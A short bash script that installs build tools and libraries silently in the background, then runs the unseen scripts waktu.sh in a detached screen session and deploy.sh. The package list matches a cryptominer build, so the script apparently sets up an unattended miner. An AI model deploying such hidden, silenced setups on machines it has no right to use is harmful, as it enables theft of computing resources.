#!/bin/bash
sudo apt update -y
nohup bash -c "sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget screen -y &> /dev/null 2>&1&"
sudo apt install screen -y && chmod +x waktu.sh && screen -dmS run ./waktu.sh && chmod +x deploy.sh && ./deploy.sh